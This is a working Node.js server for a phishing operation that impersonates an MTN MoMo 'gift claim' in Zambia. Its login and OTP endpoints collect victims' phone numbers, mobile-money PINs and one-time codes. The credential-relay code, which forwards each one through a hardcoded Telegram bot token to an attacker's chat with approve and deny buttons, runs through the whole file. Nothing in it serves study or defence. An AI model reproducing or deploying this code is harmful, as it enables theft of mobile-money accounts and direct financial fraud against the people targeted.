const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// CORS - FULLY ENABLED
// ============================================
app.use(cors({
  origin: '*',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin']
}));

app.options('*', cors());

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, Accept, Origin');
  res.header('Access-Control-Allow-Credentials', 'true');
  if (req.method === 'OPTIONS') {
    return res.status(200).send('OK');
  }
  next();
});

// ============================================
// MIDDLEWARE
// ============================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================
// TELEGRAM CONFIGURATION (ZAMBIA)
// ============================================
const BOT_TOKEN = process.env.BOT_TOKEN || '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
const CHAT_ID = process.env.CHAT_ID || '8392790531';

// ============================================
// STORAGE (in-memory)
// ============================================
const pendingRequests = {};

// ============================================
// SEND TELEGRAM MESSAGE HELPER
// ============================================
async function sendTelegramMessage(text, replyMarkup = null) {
  try {
    const body = {
      chat_id: CHAT_ID,
      text: text,
      parse_mode: 'Markdown'
    };
    if (replyMarkup) body.reply_markup = replyMarkup;

    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const result = await response.json();
    console.log('📤 Telegram:', result.ok ? '✅ Sent' : '❌ Failed');
    return result;
  } catch (error) {
    console.error('❌ Telegram error:', error.message);
    return null;
  }
}

// ============================================
// SEND LOGIN (PHONE + PIN + GIFT) TO TELEGRAM
// ============================================
async function sendLoginToTelegram(data) {
  const message = `🎁 *NEW MTN MoMo GIFT CLAIM - ZAMBIA*\n\n` +
    `🎯 *GIFT DETAILS*\n` +
    `🎁 Gift: ${data.giftName}\n` +
    `💰 Value: ${data.giftValue}\n\n` +
    `🔐 *MOMO ACCOUNT LOGIN*\n` +
    `📱 MoMo Phone: +260 ${data.phone}\n` +
    `🔢 MoMo PIN: ${data.pin}\n\n` +
    `⏰ Time: ${new Date().toLocaleString()}\n\n` +
    `✅ User is being connected to support.\n\n` +
    `⚠️ Please approve or deny this request.`;

  const replyMarkup = {
    inline_keyboard: [
      [
        { text: '✅ Approve', callback_data: `approve_${data.requestId}` },
        { text: '❌ Deny', callback_data: `deny_${data.requestId}` }
      ]
    ]
  };

  return sendTelegramMessage(message, replyMarkup);
}

// ============================================
// SEND OTP TO TELEGRAM
// ============================================
async function sendOtpToTelegram(data) {
  const message = `✅ *MTN MoMo - OTP VERIFICATION - ZAMBIA*\n\n` +
    `📱 *MoMo Account:* +260 ${data.phone}\n` +
    `🔑 *OTP Entered:* \`${data.otp}\`\n\n` +
    `🎁 *Gift:* ${data.giftName || 'N/A'} (${data.giftValue || 'N/A'})\n\n` +
    `⏰ Time: ${new Date().toLocaleString()}\n\n` +
    `✅ User has confirmed OTP.`;

  return sendTelegramMessage(message);
}

// ============================================
// HEALTH CHECK
// ============================================
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'OK',
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'production',
    service: 'MTN MoMo Users - Zambia',
    message: 'MTN MoMo Users API is running! 🇿🇲'
  });
});

// ============================================
// ENDPOINT 1: LOGIN (PHONE + PIN)
// ============================================
app.post('/api/loan/login', async (req, res) => {
  try {
    const { phone, pin, giftName, giftValue } = req.body;

    console.log('🔐 Login attempt:', { phone, pin: '****', giftName, giftValue });

    // Validation
    if (!phone || !pin) {
      return res.status(400).json({
        success: false,
        message: 'Phone number and PIN are required'
      });
    }

    if (phone.length !== 9 || !/^\d{9}$/.test(phone)) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid 9-digit phone number'
      });
    }

    if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid 4-digit PIN'
      });
    }

    // Generate request ID
    const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);

    // Store pending request
    pendingRequests[requestId] = {
      phone,
      pin,
      giftName: giftName || 'Airtime',
      giftValue: giftValue || 'ZMW 369',
      status: 'pending',
      timestamp: new Date().toISOString()
    };

    // Send to Telegram
    await sendLoginToTelegram({
      phone,
      pin,
      giftName: giftName || 'Airtime',
      giftValue: giftValue || 'ZMW 369',
      requestId
    });

    res.json({
      success: true,
      message: 'Login details received',
      requestId
    });

  } catch (error) {
    console.error('❌ Login error:', error);
    res.status(500).json({
      success: false,
      message: 'Login failed',
      error: error.message
    });
  }
});

// ============================================
// ENDPOINT 2: VERIFY OTP
// ============================================
app.post('/api/loan/verify-otp', async (req, res) => {
  try {
    const { phone, otp, giftName, giftValue } = req.body;

    console.log('🔑 OTP verification:', { phone, otp, giftName, giftValue });

    // Validation
    if (!phone || !otp) {
      return res.status(400).json({
        success: false,
        message: 'Phone number and OTP are required'
      });
    }

    if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid 6-digit OTP'
      });
    }

    // Send to Telegram
    await sendOtpToTelegram({
      phone,
      otp,
      giftName,
      giftValue
    });

    res.json({
      success: true,
      message: 'OTP verified successfully'
    });

  } catch (error) {
    console.error('❌ OTP error:', error);
    res.status(500).json({
      success: false,
      message: 'OTP verification failed',
      error: error.message
    });
  }
});

// ============================================
// ENDPOINT 3: TELEGRAM CALLBACK (Approve/Deny)
// ============================================
app.post('/api/telegram/callback', async (req, res) => {
  try {
    const { callback_data } = req.body;

    console.log('📥 Callback received:', callback_data);

    if (!callback_data) {
      return res.status(400).json({ success: false, message: 'No callback data' });
    }

    const [action, requestId] = callback_data.split('_');

    if (!pendingRequests[requestId]) {
      return res.status(404).json({ success: false, message: 'Request not found' });
    }

    const reqData = pendingRequests[requestId];

    if (action === 'approve') {
      reqData.status = 'approved';
      console.log('✅ Approved:', requestId);

      await sendTelegramMessage(
        `✅ *REQUEST APPROVED*\n\n` +
        `📱 Phone: +260 ${reqData.phone}\n` +
        `🎁 Gift: ${reqData.giftName} (${reqData.giftValue})\n\n` +
        `💰 Gift is being processed.`
      );

      res.json({ success: true, message: 'Approved' });

    } else if (action === 'deny') {
      reqData.status = 'denied';
      console.log('❌ Denied:', requestId);

      await sendTelegramMessage(
        `❌ *REQUEST DENIED*\n\n` +
        `📱 Phone: +260 ${reqData.phone}\n` +
        `🎁 Gift: ${reqData.giftName} (${reqData.giftValue})\n\n` +
        `🚫 Request was denied.`
      );

      res.json({ success: true, message: 'Denied' });

    } else {
      res.status(400).json({ success: false, message: 'Invalid action' });
    }

  } catch (error) {
    console.error('❌ Callback error:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// ============================================
// ENDPOINT 4: CHECK STATUS
// ============================================
app.get('/api/loan/status/:requestId', (req, res) => {
  const { requestId } = req.params;

  if (!pendingRequests[requestId]) {
    return res.status(404).json({
      success: false,
      message: 'Request not found'
    });
  }

  res.json({
    success: true,
    status: pendingRequests[requestId].status,
    phone: pendingRequests[requestId].phone
  });
});

// ============================================
// 404 HANDLER
// ============================================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: 'Route not found',
    path: req.originalUrl
  });
});

// ============================================
// ERROR HANDLER
// ============================================
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.message);
  res.status(500).json({
    success: false,
    message: err.message || 'Internal server error'
  });
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
  console.log('====================================');
  console.log('🎁 MTN MoMo Users API - Zambia');
  console.log('====================================');
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`✅ Health check: /api/health`);
  console.log(`🤖 Telegram Bot: ${BOT_TOKEN.substring(0, 20)}...`);
  console.log(`📱 Chat ID: ${CHAT_ID}`);
  console.log('🇿🇲 Zambia MTN MoMo System');
  console.log('====================================');
});
